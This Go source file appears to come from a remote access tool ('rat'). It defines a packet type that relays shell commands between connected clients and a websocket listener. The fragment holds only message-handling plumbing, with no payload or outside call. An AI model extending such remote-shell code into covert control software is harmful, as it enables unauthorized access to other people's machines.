package main

import (
	"rat/shared/network/header"

	"gopkg.in/mgo.v2/bson"
)

type ShellPacket struct {
	Action  int    `network:"send"`
	Command string `network:"send,receive"`
}

func (packet ShellPacket) Header() header.PacketHeader {
	return header.ShellHeader
}

func (packet ShellPacket) Init(c *Client) {

}

func (packet ShellPacket) OnReceive(c *Client) error {
	if ws, ok := c.Listeners[header.ShellHeader]; ok {
		return sendMessage(ws, c, ShellCommandMessage{packet.Command})
	}

	return nil
}

func (packet ShellPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
